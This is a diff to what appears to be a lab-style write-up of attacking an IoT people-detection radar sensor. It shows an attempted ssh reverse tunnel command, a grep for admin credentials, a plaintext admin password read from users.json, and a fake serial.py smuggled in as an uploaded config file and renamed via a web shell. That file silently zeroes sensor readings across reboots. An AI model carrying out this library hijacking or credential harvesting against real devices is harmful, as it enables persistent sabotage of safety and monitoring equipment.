@@ -355,12 +355,113 @@ Now our deserialization attack got success.
 
 #### Bypass IoT Authorization and Implement Local File Hijacking Attack
 
+Now we have successful to run command on the IoT device, can we create a reverse shell on the IoT or SCP file in to it ? we try the reverse shell command first: 
+
+```
+ssh -R 0.0.0.0:7070:localhost:22 172.23.155.1
+```
+
+We found that the ssh client is not installed, the error is shown below so we can not use reverse shell and SCP to transfer file to the IoT device:
+
+![](img/s_17.png)
+
+Can we use command to change the firmware to implement the attack? Based on the file permission config as shown below, only the config file is allowed to write, all the firmware file are only allow read and execute:
+
+![](img/s_16.png)
+
 Based on the 2nd vulnerability, the attacker try to search some data related to the string "admin" with the cmd 
 
 ```
 grep "admin" Xandar_Sensor_Web/src/*
 ```
 
-Then we can find there is one json file contents the "admin" but without the password:
+Then we can find there is one json file named users.json contents the "admin" but without the password:
 
 ![](img/s_15.png)
+
+Now we can cate the `Xandar_Sensor_Web/src/users.json` file: 
+
+![](img/s_18.png)
+
+Now we can find the long password of the admin user: 
+
+```
+7kylHS@n3pEGgS$M&HYJmRf4A!a*xfdZADAG^HWDYx#tSBkjcW
+```
+
+Then we can login the IoT admin page:
+
+![](img/s_19.png)
+
+And view the radar detection result, manage the radar user and the data fetch from the radar, but how to the admin can also reset the settings and we can not change the firmware, is there a way to permanently compromised the IoT device?  
+
+![](img/s_20.png)
+
+The attack go thought all the pages, finally he find a place which can upload text format config file, but the file name must be Config_xxx.txt
+
+![](img/s_21.png)
+
+He cat the radar serial communication firmware module  find it use python serial to read the data from the people detection radar:
+
+![](img/s_22.png)
+
+and it init the serial communication with this code:
+
+```
+self.serComm = serial.Serial(self.serialPort, 115200, 8, 'N', 1, timeout=1)
+```
+
+Then use the read() function to read data from the radar, 
+
+Now the hacker can do the local Local File Hijacking to replace the serial lib, the hacker make a serial.py file with below contents:
+
+```
+from struct import pack
+
+class Serial(object):
+
+    def __init__(self, port, bandwidth, bitNumber, parity, stopBit, timeout=1) -> None:
+        pass
+
+    def read(self, data):
+        dataByte = b''
+        for _ in range(2):
+            data = self.dataHeader + pack('i', int(0)) + pack('i', 34)
+            for _ in range(35):
+                data += pack('f', round(0), 2)
+            dataByte += data
+        return dataByte
+    
+    def close():
+        pass
+```
+
+Now we change this fake serial library to config_new.txt and upload in the IoT via the web portal and from the web shell, we can see the fake config file is accepted by the IoT device. ![](img/s_23.png)
+
+Then change the file name from the web shell with cmd:
+
+```
+mv Xandar_Sensor_Web/src/Config_new.txt Xandar_Sensor_Web/src/serial.py
+```
+
+![](img/s_24.png)
+
+Now our library hijacking attack has finished. 
+
+
+
+#### Show the Attack Effect
+
+Now as there is only one config file, the IoT's config is not changed, and the fake serial communication module has been hijacked in the IoT and the firmwork will import his lib when it is executing:
+
+![](img/s_27.png)
+
+Once any one restart the IoT device power, when the network admin log in the IoT device, he will see the below situation:
+
+![](img/s_25.png)
+
+The radar connection indicator shows the radar is connected normally, but all the reading start to drop to 0. If we check all the reading they are also all 0 value:
+
+![](img/s_26.png)
+
+No matter the IoT engineer reboot the IoT os, or reset the config file, he can not solve this problem. Now the IoT device is compromised ! 
